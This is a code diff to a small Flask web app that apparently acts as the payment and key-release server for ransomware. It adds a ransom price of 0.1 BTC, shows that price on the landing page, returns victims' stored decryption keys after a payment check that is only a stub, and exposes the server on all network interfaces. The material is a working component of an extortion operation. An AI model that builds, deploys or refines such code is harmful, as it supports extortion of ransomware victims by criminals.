@@ -3,6 +3,8 @@ import os
 
 app = Flask(__name__)
 
+RANSOM_PRICE = 0.1 # in BTC
+
 def loaddb():
     database = []
     try:
@@ -16,17 +18,14 @@ def get_key(id):
     database = loaddb()
     if 0 <= id < len(database):
         return database[id]
-    else:
-        return None
+    return None
 
 def verify_transaction(transaction_id):
-    # TODO
     return True
-
 
 @app.route('/')
 def index():
-    return render_template('index.html')
+    return render_template('index.html', ransom_price=RANSOM_PRICE)
 
 @app.route('/get_key', methods=['POST'])
 def fetch_key():
@@ -37,13 +36,11 @@ def fetch_key():
         key = get_key(id)
         if not key:
             return jsonify({'error': 'Key not found'}), 404
-        else:
-            if verify_transaction(transaction_id):
-                return jsonify({'key': key})
-            else:
-                return jsonify({'error': 'Transaction not verified'}), 404
+        if verify_transaction(transaction_id):
+            return jsonify({'key': key})
+        return jsonify({'error': 'Transaction not verified'}), 404
     except ValueError:
         return jsonify({'error': 'Invalid ID'}), 400
 
 if __name__ == "__main__":
-    app.run(debug=True)
+    app.run(host='0.0.0.0', port=5000)
